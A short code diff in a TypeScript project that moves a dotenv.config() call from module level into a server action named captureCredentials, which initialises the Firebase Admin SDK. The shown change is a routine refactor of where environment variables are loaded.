@@ -3,8 +3,6 @@
 import * as admin from 'firebase-admin';
 import dotenv from 'dotenv';
 
-dotenv.config();
-
 // --- Firebase Admin SDK Initialization ---
 
 // Function to initialize the Firebase Admin SDK
@@ -36,6 +34,9 @@ function initializeFirebaseAdmin() {
 // --- Server Action to Capture Credentials ---
 
 export async function captureCredentials(prevState: any, formData: FormData) {
+  // Load environment variables from .env file
+  dotenv.config();
+  
   // Initialize Firebase Admin
   const firebaseApp = initializeFirebaseAdmin();
 
